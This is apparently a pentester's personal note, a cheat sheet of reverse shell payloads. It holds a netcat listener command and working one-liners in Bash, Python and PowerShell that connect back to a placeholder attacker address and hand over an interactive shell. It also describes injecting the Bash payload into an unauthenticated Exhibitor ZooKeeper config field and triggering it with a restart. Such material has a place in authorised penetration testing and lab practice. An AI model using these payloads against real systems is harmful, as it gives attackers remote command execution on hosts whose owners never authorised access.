# Reverse Shells

Collection of reverse shell payloads for different scenarios. Always start your listener first:

```bash
nc -lvnp <PORT>
```

---

## Bash
```bash
/bin/bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1
```

## Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## PowerShell (Windows)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<KALI_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Exhibitor ZooKeeper — java.env Script
→ Used when Exhibitor web UI is exposed with no auth. Injected into the `java.env script` field under the Config tab, then triggered via Restart.
```bash
export JAVA_OPTS="-Xms1000m -Xmx1000m"
/bin/bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1
```

---

## Related Notes

- [[Netcat]]
- [[Msfvenom]]
